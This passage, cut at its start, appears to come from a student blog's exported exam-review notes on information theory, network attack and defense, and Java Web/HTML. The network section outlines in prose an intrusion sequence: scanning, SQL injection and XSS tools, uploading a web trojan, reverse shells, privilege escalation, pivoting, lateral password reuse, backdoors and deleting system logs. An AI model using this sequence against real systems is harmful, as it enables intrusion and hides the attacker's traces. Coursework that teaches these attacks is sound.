后所消除的关于事件 $x_i$ 的不确定性 🔆 平均自信息 H(X) — 信息熵信息熵只会减少，不会增加。是对信源的平均不确定性的描述 平均自信息量表征整个信源的不确定度，又称信息熵、信源熵、简称熵 一个随机变量的所有可能的取值和这些取值对应的概率 $[X,P(X)]$ 称为它的概率空间 随机变量 $X$ 的每一个可能取值的自信息 $I(x_i)$ 的统计平均值定义为随机变量 $X$的平均自信息量 $H(X)&#x3D;E\\ [\\ I(x_i)\\ ] &#x3D; -\\sum^{q}_{i&#x3D;1}p(x_i)\\ log\\ p(x_i)$ $q$ 为 $X$ 的所有可能取值的个数 熵有什么作用 信源编码定理 定长信源编码定理给出了定长编码时每个信源符号最少所需的码符号的理论极限，该值由 $H(S)$ 决定。 熵函数的性质 联合熵与条件熵二维随机变量XY的联合熵定义为联合自信息的数学期望，它是二维随机变量XY的不确定性度量。 对联合熵的所有可能值进行统计平均，得出给定X时，Y的条件熵 $H(Y|X)$ 熵函数的链规则 🔆 平均互信息 $I(X;Y)$ 平均互信息的作用 信道容量为平均互信息对于输入概率分布的最大值当信道输入等概分布时，输出也为等概分布，信道达到信道容量，也就是最大。 平均互信息 $I(X;Y)$ 是信源概率分布 $p(x_i)$ 的上凸函数，又是信道传递概率 $p(y_j,x_i)$ 的下凸函数，因此信道容量 $C$ 和信息失真函数 $R(D)$ 具有对偶性。 第三章 信源 信源熵 考点离散平稳，什么叫平稳性、无记忆性 P26 ✅ 假设是这种信源，就给了条件 P27 极限熵 定义是什么 ✅ 平均符号熵 ✅ 分成不同的信源，就是对应不同的假设，怎么计算极限熵（其实就是信源熵） ✅马尔多夫信源 了解一下 ✅ P35 剩余度 ✅ 信源的分类（根据离散还是连续）离散信源（数字信源） 离散随机变量序列。文字、数据、离散化图像 连续信源 连续随机变量序列。多人跳远比赛的结果，语音信号抽样以后 波形信源（模拟信源）— 连续 语音、音乐、热噪声、图像、图形 信源的分类（根据概率分布）根据概率分布是否随时间的推移而变化 平稳信源 离散平稳信源：信源的概率分布与事件无关 各维联合概率分布均与时间起点无关的信源，称为离散平稳信源 非平稳信源 信源的分类（根据统计独立）根据随机变量间是否统计独立 无记忆信源 离散平稳无记忆信源输出的符号序列是平稳随机序列，且符号之间是无关的，即统计独立的。不同时刻发出的消息是独立的 无记忆平稳信源，输出N长符号序列的信源记为： $X&#x3D;X_1X_2…X_N&#x3D;X^N$ 关系： $H(X)&#x3D;H(X^N)&#x3D;NH(X)$ 离散平稳无记忆信源的熵率： $H_{\\infin}&#x3D;lim_{N\\to \\infin}H_N(X)&#x3D;lim_{N\\to\\infin}\\frac{1}{N}·NH(X)&#x3D;H(X)$ 有记忆信源 每个随机变量之间存在统计依赖关系 极限熵（熵率）熵率：信源输出的符号序列中，平均每个符号所携带的信息量 平均符号熵：随机变量序列中，对前N个随机变量的联合熵求平均： $H_N(X)&#x3D;\\frac{1}{N}H(X_1X_2…X_N)$ 当 $N\\to \\infin$ 时，上式极限存在，则 $lim_{N\\to \\infin}H_N(X)$ 称为熵率，或极限熵 $H_{\\infin} &#x3D; lim_{N\\to \\infin}H_N(X)$ 马尔可夫信源有一类信源，在某时刻发出的符号仅与在此之前发出的有限个符号有关，而与更早些时候发出的符号无关，这称为马尔可夫性，这类信源称为马尔可夫信源 剩余度一个信源的极限熵与具有相同符号集的最大熵的比值称为熵的相对率 $\\eta&#x3D;\\frac{H_{\\infin}}{H_0}$ ，信源剩余度 $\\gamma &#x3D;1-\\eta&#x3D;1-\\frac{H_\\infin}{log_2q}$ ， $H_0-H_\\infin$ 越大，信源的剩余度越大。 信源的剩余度来自两个方面： 信源符号间的相关性，相关程度越大，符号间的依赖关系越长，信源的 $H_\\infin$ 越小 信源输出消息的不等概分布使信源的 $H_\\infin$ 减小 当信源输出符号间不存在相关性，且输出消息为等概分布时，信源的 $H_\\infin$ 最大，等于 $H_0$ 为有效传递信息，要压缩信源剩余度，方法是减少符号间的相关性，并尽可能的使信源输出消息等概分布 第四章 信道容量（和互信息有关系） 考点4.1 4.2 4.3 4.4 平稳、无记忆、有记忆是什么 ✅ P49 先验概率、后验概率容易混淆。xyz是信道容量。知道什么是先验概率什么是后验概率 ✅ pxi先验概率 pyj后验概率 信道容量 4.2.2 ✅ 信道容量是平均互信息。。。。。哪一种概率分布可以使得xy最大。 计算信道容量 信道分类无记忆信道 信道的输出只与信道该时刻的输入有关而与其他时刻的输入、输出无关 有记忆信道 信道的输出与其他时刻的输入输出有关，信道中的记忆现象来源于物理信道中的惯性，如电感电容等 平稳信道（恒参信道） 信道的统计特性不随时间变化 非平稳信道（随参信道） 信道的统计特性随时间变化 先验概率、后验概率 信道容量信道容量为平均互信息对于输入概率分布的最大值当信道输入等概分布时，输出也为等概分布，信道达到信道容量，也就是最大。 对于固定的信道，总存在一种概率信源（某种输入概率分布）使信道传输一个符号接收端获得的平均信息量最大，也就是说对于每个固定信道都有一个最大的信息传输率，这个最大信息传输率即为信道容量。 计算信道容量 第五章 信源编码 考点5.1 5.2 5.3 5.4 定理，要知道定理的内容。香农第一第二第三定理。定理解决了什么样的问题。最好知道怎么推导的 ✅ 编码：香农编码、霍夫曼编码 ✅ 定理定长码及定长信源编码定理 用以实现无失真的编码，所编的码必须是唯一可译码。根据定长信源编码定理，每个信源符号平均所需的二元码符号可大大减少，从而使编码效率提高。 定长信源编码定理给出了定长编码时每个信源符号最少所需的码符号的理论极限，该值由 $H(S)$ 决定。 对定长码来说，若定长码是非奇异码。则它的任意有限长 $N$ 次扩展码一定也是非奇异码，因此定长非奇异码一定是唯一可译码。 变长码和变长信源编码定理 变长码要成为唯一可译码不仅本身应是非奇异的，而且它的有限长 $N$ 次扩展码也应是非奇异的。 紧致码平均码长界限定理 对同一信源用同一码符号集编成的即时码或唯一可译码可有很多种。从高效传输信息的角度，要选择码符号序列长度较短的码字，也就是采用码长较短的码字，所以有了码的平均长度 无失真变长信源编码定理（香农第一定理）—— 改进信源编码信源的信息熵是无失真信源编码平均码长的极限值，也可以认为信源的信息熵是表示每个信源符号平均所需最少的二元码符号数 要做到无失真信源编码，每个信源符号平均所需最少的 $r$ 元码符号数就是信源的熵值。若编码的平均码长小于信源的熵值，则唯一可译码不存在，在译码时必然带来失真或差错。 通过对扩展信源进行变长编码，当 $N \\to \\infin$ 时，平均码长 $\\frac{\\bar{L_N}}{N}$ 可达到这个极限值 香农编码 二元霍夫曼编码 霍夫曼码编码方法，得到的码不是唯一的 每次对信源缩减时，概率最小的两个信源符号对应的码符号0和1是可以互换的，所以可得到不同的霍夫曼码 对信源进行缩减时，如果两个概率最小的信源符号合并后的概率与其他信源符号的概率相同，则在缩减信源中进行概率排序的次序可以是任意的，因此会得到不同的霍夫曼码。 霍夫曼编码的特点 霍夫曼码是用概率匹配的方法进行信源编码，它的特点保证了霍夫曼码一定是最佳码。特点如下： 霍夫曼码的编码方法保证了概率大的信源符号对应于短码，概率小的信源符号对应于长码，充分利用短码 每次缩减信源的最后两个码字有相同的码长，并且总是最后一位码元不同，前面各位码元相同 第六章 信道编码 考点除卷积码都看 线性码，nk 都代表什么 编码定理 香农第二定理 线性代数和编码怎么对应起来的。怎么用线性代数解决编码的问题。 信道编码定理（香农第二定理）— 改进信道编码信道中存在噪声或干扰，信息传输会造成损失。 信道中无错误传输的最大信息传输率，这个极限就是香农第二定理。传送消息在传送前事先编码，接收端采用适当方法译码，可以实现通过不可靠信道实现可靠的信息传输。 错误概率与信道的统计特性有关。信道的统计特性可由信道矩阵来表示，由信道矩阵就可以求出错误概率。 线性码分组码：把信息序列以每 $k$ 个码元分组，然后把每组 $k$ 个信息元按一定规律产生 $r$ 个多余的校验元，输出序列每组长为 $n&#x3D;k+r$ 。每一码字的 $r$ 个校验元只与本组的 $k$ 个信息元有关，与别的分组的信息位无关，记为分组码 $(n,k)$ 树码：信息序列以每 $k_0$ 个码元分段，编码器输出该段的校验元不仅与本段的 $k_0$ 个信息元有关，而且还与其前面若干段的信息元有关，称为树码或链码，卷积码，它的校验元与信息元的关系是线性关系 $(n,k)$ 线性分组码是 $n$ 维 $n$ 长向量构成的线性空间中一个 $k$ 维线性子空间 线性分组码的性质 码中任意两个码字之和仍为一码字 任意码字是 $\\bold{G}$ 的行向量 $G_1,G_2,…,G_k$ 的线性组合 零向量 $\\bold{0}&#x3D;(0,0,….,0)$ 是一个码字，称为零码字 线性分组码的最小距离等于非零码字的最小重量 线性分组码最重要的性质是其线性特性以及在此基础上的对称性。 线性特性是指线性码中任意两个 码字的和或差仍为一码字。 对称性是指我们在一个码的所有码字上减去一个特定的码字，结果仍是同一码的全部码字 线性分组码的最小Hamming距离等于其非零码字的最小Hamming重量 对于任何线性分组码，码字的重量或全部为偶数，或奇数重量的码字数为偶数 第七章 考点7.1 7.2 7.3 7.4 （预）失真函数的定义，平均失真度，平均失真的概念 概率编码定义，概念。知道例题和习题怎么做 失真函数失真函数的定义 失真函数是根据人们的实际需要和失真引起的损失、风险大小等人为规定的 对于每一对 $(x_i,y_j)$ 指定一个非负的函数 $d(x_i,y_j)\\ge0,\\ i&#x3D;1,2,….,s$ ，表示信源发出一个符号 $x_i$ ，而在接收端再现为 $y_i$ 所引起的误差或失真的大小，称 $d(x_i,y_j)$ 为单个符号的失真度或失真函数，通常较小的 $d$ 值代表较小的失真，而 $d(x_i,y_j)&#x3D;0$ 表示没有失真 汉明失真 平均失真度 课后题第二章 第三章 第四章 第五章 第六章 第七章 部分课后习题详解","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"信息论与编码","slug":"期末考试/信息论与编码","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%BF%A1%E6%81%AF%E8%AE%BA%E4%B8%8E%E7%BC%96%E7%A0%81/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"网络攻防期末考试","slug":"网络攻防期末考试","date":"2021-06-25T11:40:52.000Z","updated":"2024-11-12T07:00:02.000Z","comments":true,"path":"2021/06/25/网络攻防期末考试/","permalink":"https://gryffinbit.top/2021/06/25/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/","excerpt":"","text":"题型选择题 15 *2 填空题 15 *1 判断题 10 * 1 简述题 5*7 网络数据分析 1*10 十个空，一整个大题 选择题unix中采用什么机制来增加了破解linux密码的难度【记一下就行了】 为不同的管理员分配不同的管理账户 限制root等特权账户的远程登陆功能 限制尝试登陆次数 密码设置符合复杂性要求 利用基于PKI技术的身份认证机制来代体传统的用户名+口令的方式 Linux的口令加密机制源于DES，通常使用56位密钥加密的64位的文本块，抵抗暴力破解的能力较弱。 为提高身份认证的可靠性，较新版本的Linux开始采用MD5、SHA-256、SHA-512、blofish等高强度的 加密算法，同时增加了salt的编码长度。 用户和组【不考】 用户 Root根，系统中唯一拥有系统管理员权限的用户，有最高控制和管理权 普通用户，登陆系统并执行基本计算任务，权限受限制 系统用户，不具有登陆系统的能力 Linux用户信息保存在系统的 /etc/passwd 文件中，包括用户名、用户唯一UID，使用Shell类型、用户初始目录。被加密后的口令放在 /etc/shadow 仅root用户可读取 组 将相同权限的用户集中纳入到同一个组中，对组设置权限使该组中所有用户自动继承组的权限。 组信息保存在 /etc/group ， 组被加密后的口令保存在 /etc/gshadow 身份认证【不考】 本地身份认证 init 启动虚拟控制台，为用户提供登陆方式 输入用户名和密码后，getty 执行登陆进程，并对身份合法性进行认证 认证通过后，通过 fork() 复制一份该用户的 shell ，完成程度操作 登陆进程通过 Crypt() 对输入的口令进行验证。也会对输入的口令加密，采用DES、MD5、SHA-256等 远程身份认证 采用SSH（Secure Shell）实现对远程访问的安全保护，优势：数据加密和数据压缩。 由三部分组成 传输层协议：为两种主机之间的认证和通信提供安全数据传输通信，通常运行于TCP&#x2F;IP之上 提供数据通信加密、加密主机身份、数据完整性校验及数据压缩 用户认证协议：SSH提供基于口令和基于密钥的两种安全验证 连接协议：完成用户请求的各种具体的网络服务 可插入身份认证模块（PAM） PAM是要求对其服务进行身份认证的应用程序与提供认证服务的认证模块之间的中间件。 PAM提供了对所有服务进行认证的中央机制。 SELinux 安全强化 授权访问【不考】 安全审计【不考】 网络欺骗，在实施交换的时候采用嗅探的攻击方式？哪一种网络欺骗技术是实施嗅探攻击的前提：ARP欺骗。 IP欺骗、dns欺骗和路由欺骗都不是 通过tcp的序列号猜测，可以通过哪种方式进行攻击？TCP会话劫持攻击 哪些网络攻击活动是隐藏的？【不包括网络流量隐藏】目前常见的网络攻击活动隐藏包括：网络连接隐藏、进程活动隐藏和目录文件隐藏。【不包括网络流量隐藏】 通信状态隐藏包括：通信端口隐藏、将后门隐藏在合法端口、通信连接隐藏。 被动攻击：窃听，流量分析 病毒、蠕虫，哪些是可以通过网络传播的？哪些不能通过网络传播？【PPT-Chap4:页16页 22页 44页】恶意代码包括计算机病毒、蠕虫、木马、后门、僵尸网络、Rootkit等。 可以通过网络传播：蠕虫、僵尸网络、木马。 不能通过网络传播：计算机病毒、Rookit、后门、 详解： 计算机病毒 计算机病毒把自身附加于程序或文件，因此它可以从一台计算机传播到另一台计算机，沿着它的传播路径感染计算机。计算机病毒本省只能在本地进行复制传播**-》计算机病毒无法通过网络传播。** 蠕虫 蠕虫（又名网络蠕虫）-》顾名思义网络蠕虫可以通过网络传输。 网络蠕虫与计算机病毒之间的区别： ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 1.png) ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 2.png) 木马 木马与其他网络的区别：，由于存在网页木马-》可以通过网络传播 ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 3.png) ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 4.png) 后门 后门，是一个网站的后门，无法通过网络传播【自身知识所得】 僵尸网络 botnet 僵尸网络（botnet）是攻击者出于恶意目的，传播僵尸程序控制大量主机，并通过一对多的命令与控制信道所组成的网络。僵尸网络是从计算机病毒、蠕虫、木马、后门等传统的恶意代码形态的基础上演化，并通过相互融合发展而成的目前最为复杂的一类网络攻击方式。-》僵尸网络可以通过网络传播 Rookit Rookit不能通过网络传播 ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 5.png) 网络监听和嗅探主要是破坏网络信息的什么？保密性 apche配置文件、日志存储文件？【PPT-Chap3:页59页】主配置文件：/etc/httpd/conf/httpd.conf、 /etc/httpd.conf 日志存储文件： 访问日志：/var/log/httpd/access_log 错误日志：/var/log/httpd/error_log 拒绝服务攻击有很多种，有一种消耗网络资源带宽，属于哪一种？系统缺陷、系统配置、物理缺陷 洪泛攻击：它让无用的信息占去系统的带宽或其他资源，使得系统不能服务于合法用户 社会工程学的概念？了解哪些属于社会工程学？社会工程学的概念： 是⼀种通过对受害者⼼理弱点、本能反应、好奇⼼、信任、贪婪等⼼理陷阱进⾏诸如 欺骗、伤害等危害⼿段，取得⾃身利益的攻击⽅法。 社会工程学利⽤了⼈们的⼼理特征，通过骗取 ⽤户的信任，获取机密信息、系统设置等不公开资料，为⽹络攻击和病毒传播创造有利条件。 属于社会工程学的： 钓鱼、诈骗等 常见社会工程学攻击方式 网络钓鱼式攻击 密码心理学攻击 收集敏感信息攻击 恐吓被攻击者攻击 反向社会工程学攻击 暴力破解或者猜测弱口令，应用环境是什么？（反过来问，哪几种不能通过弱口令进行攻击）Sql注入，用到了服务器、数据库的哪些漏洞？Web漏洞、sql注入漏洞 （1）用户提供的数据没有经过应用程序的验证、过滤或净化 （2）动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。 （3）在ORM搜索参数中使用了恶意数据，这样搜索将获得包含敏感或未授权的数据 （4）恶意数据直接被使用或者连接，如SQL语句或命令在冬天查询语句、命令或存储过程中包含结构和恶意数据。 预攻击阶段要干什么？进行攻击前的准备 确定攻击所针对的操作系统类型、应用平台类型等，根据获取的信息，查看有哪些可以利用的漏洞 进行信息收集 网络信息、系统信息 用户信息 网络扫描、漏洞扫描等 端口扫描的作用是什么？信息挖掘的作用- 了解系统向外界提供了哪些服务 探测目标主机系统端口目前正向外提供何种服务 Nmap可以实现哪些功能？端口扫描、主机发现、主机扫描、漏洞扫描 数据库通常用户名mysql: root sqlserver: sa root、admin不是正确选项 填空题发出攻击的生命周期？分为三个步骤：攻击发起阶段、攻击作用阶段、攻击结果阶段。 加密体系 des?aes? 对称&#x2F;非对称？加密体系：对称、非对称、base64位加密、消息摘要算法、数字签名算法非对称加密算法：Rsa、DSA、ECC 对称加密算法：Des、Aes、RC4 Linux体系架构分为几层？【PPT-Chap3:页7】lInux体系架构分为两层： 用户态（用户空间）和 内核态（内核） Linux操作系统采用宏内核（Monolithic Kernel）架构，整个操作系统是一个运行在核心态的单一的进程文件，这个二进制文件包含进程管理、内存管理、文件管理等。 计算机病毒由什么组成？计算机病毒一般由感染标记、初始化模块、感染模块和表现模块组成。 简述题B&#x2F;S、C&#x2F;S架构？概念、特点、体系结构要清楚B&#x2F;C （Browser&#x2F;Server）【浏览器&#x2F;服务器结构】 概念： 基于B&#x2F;S结构的应用系统由前端的浏览器和后端的服务器组成，数据和应用程序都放在服务器上。 体系结构： B&#x2F;S结构是由表示层、业务逻辑层和数据层组成的典型的三层体系结构。 特点： 优点：1. 统一了客户端应用软件 2. 易于部署和维护 3. 可扩展性好 4. 信息共享度高 缺点：1. 功能受限 2. 复杂的应用构造困难 3. 安全隐患较大 C&#x2F;S （Client&#x2F;Server）【客户机&#x2F;服务器模式】 概念： C&#x2F;S 结构是指将事务处理分开进行的网络系统 详细：C&#x2F;S结构将与用户交互的图形用户界面（Graphical User Interface，GUI）和业务应用处理与 数据库访问与处理相分离，服务器与客户机之间通过消息传递机制进行对话，由客户机向服务 器发出请求，服务器在进行相应的处理后经传递机制向客户机返回应答 体系结构： 第一层：在客户机系统上有机融合了表示与业务逻辑 第二层：通过网络结合了数据库服务器 特点： 优点：1. 交互性强 2. 具有较强的数据操纵与事务处理能力 3. 可有效保护数据的安全性 缺点：1. 可扩展性差 2. 应用规模受限 什么是主动攻击？被动攻击？主动攻击、被动攻击的特点？主动攻击 主动攻击是指：攻击者为了实现攻击目的，主动对需要访问的信息进行非授权的访问行为。可以分为：中断、篡改、伪造三种类型 【分别针对可用性、完整性和真实性】 特点：难以预防，但却容易检测，所以重点是在于检测并从破坏中恢复 被动攻击 被动攻击是指：利用网络存在的漏洞和安全缺陷对网络体系的硬件、软件及系统中的数据进行的攻击 。【被动攻击主要分为窃听和流量分析两种方式。】 特点： 一般不对数据进行篡改 通过截取或窃听等方式，未经用户授权，对消息内容进行获取或对业务数据进行分析 黑客攻击的过程？（还要具体解释，信息获取怎么获取，巴拉巴拉的）目录探测 → 信息收集→ 获得访问权限 → 提权 → 信息窃取 → 清理痕迹 → 创建后门 信息搜集 → 漏洞探测→ 漏洞利用【获得webshell+提权】→内网转发→内网横向渗透→权限维持【创建并隐藏后门，进行长期的信息收集】→清理痕迹 信息收集：比如：服务器的类型与版本【windwos还是linux】【方法：nmap -O ip 进行扫描】、脚本类型【Php、jsp还是asp等】【Firefox的插件wappalyzer查看】、网站容器【tomcat、apache、iis等】、数据库类型与版本【mysql、orcale等】、目标开放的端口【nmap端口扫描】，指定端口运行的服务【Nessus主机扫描】、目标主机上有哪些漏洞【Nessus漏洞扫描】、目录敏感目录和文件【御剑】、旁站和C段扫描、还可以通过谷歌黑客语法进行网站人员的信息搜集。 漏洞探测：探测网站是否存在一些常见的Web漏洞，比如sql注入、xss、ssrf、文件上传等。【通过网站漏洞扫描工具+手工测试：半自动化，工具比如：Nessus、AWVS】 漏洞利用： 当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的webshell，我们往往需要结合几个漏洞来拿webshell。常用的漏洞利用工具如下：SQL注入 —&gt; Sqlmap的使用 XSS—&gt; Beef-XSS的使用 Burpsuite进行抓包改包 上传漏洞的话→上传一句话木马上去，进而再获得webshell。 获得了webshell后，一般权限很低，所以我们需要提权，可以选择反弹一个MSF类型的shell提权，也可以MSF和CobaltStrike联动。 也可以使用其他提权：Windows提权 、 Linux提权 内网转发：进一步的探测内网主机的信息的话，我们就需要进行内网转发了。通过各种类型的代理，比如EW正向代理、EW反向代理等 内网横向渗透： windows主机：去翻目录或者桌面上的备忘录中，可以找到一些隐私信息。我们还可以查找数据库的连接文件，查看数据库的连接账号密码等敏感信息。我们尽量不要使用远程桌面。从该主机上找到的账号密码，可以做一个字典，在对内网其他机器进行爆破的时候，很有可能是同密码。 创建后门：入侵系统后，对自己题提权，拥有修改注册表的权限，然后通过修改注册表实现对系统的攻击或为下一次攻击做好准备。 清理痕迹：在渗透前挂上代理，然后在渗透后痕迹清理：删除并篡改系统日志，避免被别人发现我们的攻击行为。 进程、线程、程序、服务，以及它们之间的关系？ 详情 【PPT-Chap2:页52-页53】 进程： 进程是正在进行的程序的实例，是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位。 例：在计算机上打开了QQ就打开了一个进程。 线程： 线程是进程的一部分，有时也称为轻量级进程（Light Weight Process，LWP），是程序执行流的最小单元。 例：在QQ这个进程里，传输文字开一个线程，传输语音开了一个线程，弹出对话框又开了一个线程。 程序： 程序是一组可执行指令的集合，是指为了得到某种结果而可以由计算机等具有信息处理能力的装置执行的代码化指令序列 服务： 服务是执行指定系统功能的程序、例程（例程是某个系统对外提供的功能接口或服务的集合，如操作系统的API，例程的作用类似于函数）或进程 ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 6.png) 进程 进程是正在进行的程序的实例 进程是系统进行资源分配和调度的基本单位 进程是一个动态的实体，有自己的生命周期 例如：在计算机上打开了QQ就打开了一个进程 线程 线程是进程的一部分，是程序执行流的最小单元。 例如QQ这个进程里，传输文字开一个线程，传输语音开一个线程 程序 程序是一组可执行指令的集合，静态实体 服务 服务是执行特定系统功能的程序、例程或进程 进程、线程之间的联系 进程和线程都是由操作系统所包含的程序运行的基本单元，系统利用该基本单元实现应用的并发性。 系统在运行时会为每一个进程分配不同的内存区域，但不会为线程分配，线程只能共享资源。 进程是系统资源分配时的一个基本单位，拥有一个完整的虚拟空间，不依赖线程独立存在 进程、线程、程序之间的联系 一个程序至少有一个进程，一个进程至少有一个线程 进程是动态实体【是程序的运行实体，有自己的生命周期】，程序是静态实体，只有程序在运行时才会产生进程。 服务与进程之间的联系 不是一一对应的 进程是当前系统使用中调用程序的实体 服务是当前使用的一些规则，服务的打开与否关系到系统能否执行某些特定的功能 什么是入侵检测？功能是什么？作用是什么？ 入侵检测：“主动防御”的检测技术 功能：具有较强的实时防护功能，可以迅速提供对系统、网络的攻击和用户误操作的实时防护 作用：在检测到入侵企图时，进行拦截或题型管理员做好防护 什么是拒绝服务？分布式拒绝服务？ 拒绝服务（Deny of Service，DoS） ： ”通过连续向攻击目标发送超出其处理能力的过量数据，消耗其有限的网络链路或操作系统资源，使之无法为合法用户提供有效服务 分布式拒绝服务(Distributed DoS，DDoS） 利用网络中不同的主机同时发起DoS 攻击，使得被攻击对象不能服务于正常用户 DoS与DDoS差异 DoS攻击中的数据包来自一个固定的攻击源 DDoS攻击中的数据包来自不同攻击源 网路数据分析学会看命令。攻击源ip地址，目标地址ip，攻击语言、目标地址、IP地址、怎么进行交互的？ TCP三次握手的含义？（建立、确认、请求、返回、建立、传输数据、释放、确认） 答案在一幅图里 ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 7.png) TCP连接扫描（TCP connect Scan）也称为“TCP全连接扫描”，它利用TCP协议的3次握手过程，直接连到目标端口并完成一个完整的3次握手过程 目标主机状态及应答数据包 Close状态 表示目标主机的端口处于关闭状态 RST数据包 → 丢弃 其它数据包 → 返回RST数据包 LISTEN状态 表示目标主机的端口处于监听状态 SYN数据包→ 返回SYN或ACK数据包→ SYN-RCVD状态 ACK数据包→ 返回RST数据包 其它数据包→ 丢弃 SYN-RCVD状态 表示目标主机的端口处于同步收到状态 RST数据包→ 返回LISTEN状态 ACK数据包 → 进入ESTABLISHED（连接建立）状态，并建立TCP连接 其它数据包→ 丢弃","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"网络攻防","slug":"期末考试/网络攻防","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"WEB 期末知识点","slug":"WEB-期末知识点","date":"2021-06-22T11:37:11.000Z","updated":"2024-11-12T06:59:06.000Z","comments":true,"path":"2021/06/22/WEB-期末知识点/","permalink":"https://gryffinbit.top/2021/06/22/WEB-%E6%9C%9F%E6%9C%AB%E7%9F%A5%E8%AF%86%E7%82%B9/","excerpt":"","text":"题型选择题平均每章3道题 判断题平均每章1道题 编程题重点9、10章 第一章 Java Web开发环境配置 在Web程序结构中，浏览器端与应用服务器端采用请求&#x2F;响应模式进行交互的过程为（） 用户输入、发送请求、访问数据库、返回结果、发送响应、显示 下列说法正确的是（） B&#x2F;S结构相较于C&#x2F;S结构服务器负担比较重，快速响应不如C&#x2F;S结构。 Tomcat安装目录中bin文件夹下存放的文件为（）。 支持Tomcat运行的常见.exe文件 JSP的全称为（）。 Java Server Pages 下面关于JSP的说法错误的是（）。 A. 利用JSP可以很方便地在页面中生成动态的内容。 B. JSP是由Sun公司提出的、其他许多公司一起参与建立的一种动态网页技术标准。 C. JSP开发的Web应用不能跨平台。 ❌ D. JSP具备了Java技术面向对象、与平台无关性且安全可靠的优点 在下列选项中，正确的URL是（）。 https://localhost:8080/Prj01/index.jsp 下面关于URL的说法错误的是（）。 A. URL的第二部分是协议。 ❌ B. URL的第二部分是主机的IP地址。 C. URL的大小写是敏感的。 D. URL的全称为“统一资源定位符”。 关于Web项目的目录结构，下面说法错误的是（）。 A. WebRoot目录是Web应用的顶层目录，也称为文档的根目录。 B. web.xml是Web应用的配置文件，可以随意修改。 ❌ C. lib文件夹里包含了Web应用所需的.jar和.zip文件。 D. META-INF是系统自动生成、用于存放系统描述信息的文件夹。 WebRoot目录是Web应用的顶层目录，也称为文档的根目录。存放配置文件WebApps文件夹里的内容是网站资源文件。META-INF存放系统描述信息的文件夹WEB-INF 存放部署描述文件 在网络应用程序中有两种基本的结构，即客户机&#x2F;服务器和浏览器&#x2F;服务器。 Web项目属于B&#x2F;S结构 在Web程序结构中，浏览器端与应用服务器端请求模式&#x2F;采用响应进行交互 在应用程序领域，Web是World Wide Web的简称。 Tomcat服务器运行的端口号默认为8080 Tomcat安装目录中webapps文件夹里的内容是网站资源文件。 IDE是帮助用户进行快速开发的软件，它的中文全称集成开发环境（Integrated Development Environment 在Web项目的目录结构中，WebRoot目录用来存放配置文件 一台Tomcat服务器的IP地址为110.74.22.15网站端口号为8080，则访问Web项目Demo中的test.jsp的URL为https://110.74.22.15:8080/Demo/test.jsp JSP规范唯一支持的语言是 Java 可以通过修改Tomcat的配置文件进行修改参数，下面的server.xml文件部分代码中，端口号是多少（） 12345&lt;Connector port=”8443” protocol=”HTTP/1.1”connectionTimeout=”8080”redirectPort=”8888”/&gt; A. 8443 ✅ B. 8888 C. 8080 D. 1.1 在Eclipse中，一个Web应用程序的部署描述文件位于（ ）目录。 A. WebRoot B. META-INF C. src D. WEB-INF ✅ web.xml 是web应用的配置文件，不能删除或随意修改，位于WEB-INF目录根目录下 关于下面这个URL说法正确的是（） http://localhost:8080/Prj01/index.jsp A. http是主机地址 B. localhost是协议 C. 8080是主机IP地址 D. prj01是主机资源目录 ✅ http是协议 localhost是主机IP地址或域名 8080是端口号 prj01&#x2F;index.jsp是主机资源具体地址，如目录和文件名等 当用户请求JSP页面时，JSP引擎会执行该页面的字节码文件响应客户的请求，执行字节码文件的结果是（） A. 发送一个HTML页面到客户端面 ✅ B. 什么都不做 C. 发送一个Java文件到客户端 D. 发送一个JSP源文件到客户端 第二章 HTML基础 HTML语言注释的格式为（）。 **** 下列关于HTML的说法不正确的是（）。 A. 之间的内容为浏览器中网页上显示的内容。 B. HTML语言大小写不敏感。 C. HTML文件必须由开头、结尾。 D. 之间的内容是用来设置一些网页相关属性和信息的，不可以省略。 ❌ &lt;head&gt;&lt;/head&gt; 可以省略 下面（）不是align属性的值。 A. top ❌ B. center C. right D. left 在下列标签中，&lt;i&gt;内容&lt;/i&gt; 是将内容设置为斜体。 【表格标签】当设置的属性有重叠时，表元的属性默认情况下总是跟它离得最近的设置相同。 在标签的属性中，alt 属性能在图片未载入或载入失败时提供替代性的文字说明。 表单中的标签表示下拉菜单。 下列关于框架的说法不正确的是（）。 A. 标签的cols属性表示将页面横向分割。 ❌ B. 一个框架网页中的每个窗口都是一个完善的HTML网页。 C. 在框架中不需要再写。 D. 每一个表示一个框架窗口，它的排序依次为从左到右、从上到下。 rows :横向分割网页。属性值决定了分割页面之间的宽度的比值。 cols :纵向分割网页。属性值决定了分割页面之间的长度的比值。 border :框架边框的宽度。当值为 0 时，表示没有边框。 HTML的中文名称是超文本标记语言。 在HTML语言中空格用&amp;nbsp表示。 在HTML中有两种类型的标签，它们分别是单标签和双标签。 在HTML文件中，文字之间的换行必须使用标签。 